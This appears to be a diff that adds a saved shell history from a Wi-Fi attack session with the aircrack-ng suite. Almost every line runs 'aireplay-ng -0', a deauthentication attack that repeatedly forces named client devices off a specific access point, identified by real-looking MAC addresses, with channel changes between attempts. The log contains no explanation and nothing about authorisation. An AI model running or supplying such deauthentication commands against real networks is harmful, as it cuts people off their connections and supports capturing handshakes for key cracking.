@@ -1,0 +1,35 @@
+    1  aircrack-ng 
+    2  air
+    3  aireplay-ng 
+    4  aireplay-ng -0 wlan0mon
+    5  aireplay-ng -0
+    6  aireplay-ng -0 wifi
+    7  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon
+    8  iwconfig
+    9  iwconfig wlan0mon channel 11
+   10  iwconfig wlan0mon channel 
+   11  iwlist wlan0mon channel
+   12  iwconfig wlan0mon channel  1
+   13  iwlist wlan0mon channel
+   14  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon
+   15  clear
+   16  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon
+   17  iwconfig wlan0mon channel  1
+   18  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon
+   19  iwconfig wlan0mon channel  1
+   20  clear
+   21  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon >1.txt
+   22  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon 
+   23  airmon-ng stop wlan0
+   24  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon 
+   25  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c 34:96:72:AE:CD:AD wlan0mon
+   26  clear
+   27  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c F4:63:1F:42:2E:E3 wlan0mon
+   28  airmon-ng stop wlan0
+   29  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c F4:63:1F:42:2E:E3 wlan0mon
+   30  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c B0:E1:7E:87:F1:59 wlan0mon
+   31  airmon-ng stop wlan0
+   32  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c B0:E1:7E:87:F1:59 wlan0mon
+   33  airmon-ng stop wlan0
+   34  aireplay-ng -0 2 -a 34:96:72:AE:CD:AD -c B0:E1:7E:87:F1:59 wlan0mon
+   35  history > h2.txt
